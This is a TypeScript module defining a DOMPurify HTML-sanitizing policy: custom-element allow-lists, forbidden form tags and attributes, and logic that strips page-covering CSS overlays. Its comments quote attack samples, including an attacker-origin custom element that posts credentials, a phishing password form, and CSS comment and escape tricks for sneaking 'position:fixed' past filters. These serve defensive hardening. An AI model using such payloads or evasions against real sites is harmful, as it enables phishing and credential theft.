/**
 * The ONE DOMPurify policy for every HTML sink fed with data (safeHtml.ts) and for rendered
 * markdown (mateu-markdown.ts). Kept free of imports so the markdown element, which loads
 * DOMPurify lazily, can share it without pulling the sanitizer into the eager bundle.
 *
 * SECURITY:
 * - Custom elements are an ALLOW-LIST, never "any". A custom element is code: `<mateu-ux
 *   baseurl="https://attacker">` coming from a record value would boot a second Mateu client
 *   inside the trusted page, POST the user's credentials to that origin and render whatever it
 *   answers. Only presentational elements with no behaviour of their own are let through, and only
 *   with the attributes listed here.
 * - Form controls are dropped: a value must not be able to paint a credential-harvesting form
 *   (`<form action=https://phish><input type=password>`) inside the app.
 */
export const SAFE_CUSTOM_ELEMENTS: readonly string[] = ['vaadin-icon']

/** Attributes a safe custom element may carry, besides the global ones DOMPurify allows. */
export const SAFE_CUSTOM_ELEMENT_ATTRIBUTES: readonly string[] = ['icon', 'theme', 'slot']

/** Tags never rendered from data. `style`: a stylesheet in a value restyles the whole app. */
export const FORBIDDEN_DATA_TAGS: readonly string[] = [
    'form', 'input', 'button', 'select', 'option', 'optgroup', 'textarea', 'datalist', 'output', 'style',
]

/**
 * Inline style declarations dropped from data (W-5): with them a value painted a page-covering
 * overlay (`position:fixed; inset:0; z-index:9999` + "Session expired — sign in again") — the
 * same phishing the form-control rule refuses, without a form. Everything else in `style` stays.
 */
const DECLARATION = /^\s*([^:]*?)\s*:\s*([\s\S]*?)\s*$/

/** CSS comments go: the browser reads `position/**\/:fixed` as `position:fixed` (an unclosed one ends the text). */
const withoutComments = (css: string): string => css.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\*[\s\S]*$/, '')

/** CSS escapes decoded as the browser's tokenizer does (`p\6fsition` IS `position`). */
const unescaped = (css: string): string => css
    .replace(/\\([0-9a-fA-F]{1,6})[ \t\n\r\f]?/g, (_, hex: string) => {
        const cp = parseInt(hex, 16)
        return cp > 0 && cp <= 0x10ffff && (cp < 0xd800 || cp > 0xdfff) ? String.fromCodePoint(cp) : '�'
    })
    .replace(/\\([\s\S])/g, '$1')

/** Whether one declaration can lift content over the page: `z-index`, or a `position` other than
 *  static/relative — including one hidden behind `var(…)`, whose value is only known at paint. */
const isOverlayDeclaration = (declaration: string): boolean => {
    const m = DECLARATION.exec(unescaped(declaration))
    if (!m) return false
    const name = m[1].toLowerCase()
    if (name === 'z-index') return true
    return name === 'position' && !/^(static|relative)(\s*!\s*important)?$/i.test(m[2])
}

/**
 * A `style` attribute's value without the overlay-capable declarations. Read the way the browser
 * reads it — comments removed, escapes decoded — not as raw text: a per-declaration regex over the
 * text let `position/**\/:fixed`, `p\6fsition:fixed` and `position:var(--x,fixed)` through (GA
 * review 2, N-9). In a browser the CSS parser checks the result once more: anything it still reads
 * as an overlay drops the whole attribute.
 */
export const withoutOverlayStyles = (style: string): string => {
    const kept = withoutComments(style).split(';').filter((d) => d.trim() !== '' && !isOverlayDeclaration(d)).join(';')
    return parsedAsOverlay(kept) ? '' : kept
}

/** The browser's own parser (when there is one) still sees a lifting declaration in `css`. */
const parsedAsOverlay = (css: string): boolean => {
    if (typeof document === 'undefined' || !css) return false
    try {
        const probe = document.createElement('div')
        probe.setAttribute('style', css)
        const decl = probe.style
        if (!decl) return false
        const position = decl.getPropertyValue('position').trim().toLowerCase()
        return decl.getPropertyValue('z-index').trim() !== '' || (position !== '' && position !== 'static' && position !== 'relative')
    } catch {
        return false
    }
}

/** Attributes never rendered from data. */
export const FORBIDDEN_DATA_ATTRIBUTES: readonly string[] = ['formaction', 'form', 'is']

/** The DOMPurify configuration (typed loosely so this module stays import-free). */
export const dataHtmlPolicy = (): Record<string, unknown> => ({
    USE_PROFILES: { html: true, svg: true, svgFilters: true },
    FORBID_TAGS: [...FORBIDDEN_DATA_TAGS],
    FORBID_ATTR: [...FORBIDDEN_DATA_ATTRIBUTES],
    CUSTOM_ELEMENT_HANDLING: {
        tagNameCheck: (tagName: string) => SAFE_CUSTOM_ELEMENTS.includes(tagName.toLowerCase()),
        attributeNameCheck: (attr: string) => SAFE_CUSTOM_ELEMENT_ATTRIBUTES.includes(attr.toLowerCase()),
        allowCustomizedBuiltInElements: false,
    },
})

/** Global attributes an allow-listed custom element may also keep (not `src`, `href`, …). */
const CUSTOM_ELEMENT_GLOBAL_ATTRIBUTES = ['class', 'style', 'title', 'id', 'role', 'lang', 'dir']

type PurifyLike = {
    addHook: (entryPoint: 'uponSanitizeAttribute',
              hook: (node: Element, data: { attrName: string, attrValue: string, keepAttr: boolean }) => void) => void
}

const hooked = new WeakSet<object>()

/**
 * A custom element keeps ONLY its listed attributes plus a few inert global ones: DOMPurify's
 * own allow-list would also keep `src` on a `<vaadin-icon>`, which makes the icon fetch and
 * inline an SVG from any origin. Installed once per DOMPurify instance (a hook is global to it).
 */
export const installDataHtmlHooks = (purify: PurifyLike): void => {
    if (hooked.has(purify)) return
    hooked.add(purify)
    purify.addHook('uponSanitizeAttribute', (node, data) => {
        if (data.attrName.toLowerCase() === 'style' && typeof data.attrValue === 'string') {
            data.attrValue = withoutOverlayStyles(data.attrValue)
        }
        const tag = node.nodeName?.toLowerCase() ?? ''
        if (!SAFE_CUSTOM_ELEMENTS.includes(tag)) return
        const name = data.attrName.toLowerCase()
        if (!SAFE_CUSTOM_ELEMENT_ATTRIBUTES.includes(name) && !CUSTOM_ELEMENT_GLOBAL_ATTRIBUTES.includes(name)
            && !name.startsWith('aria-')) {
            data.keepAttr = false
        }
    })
}
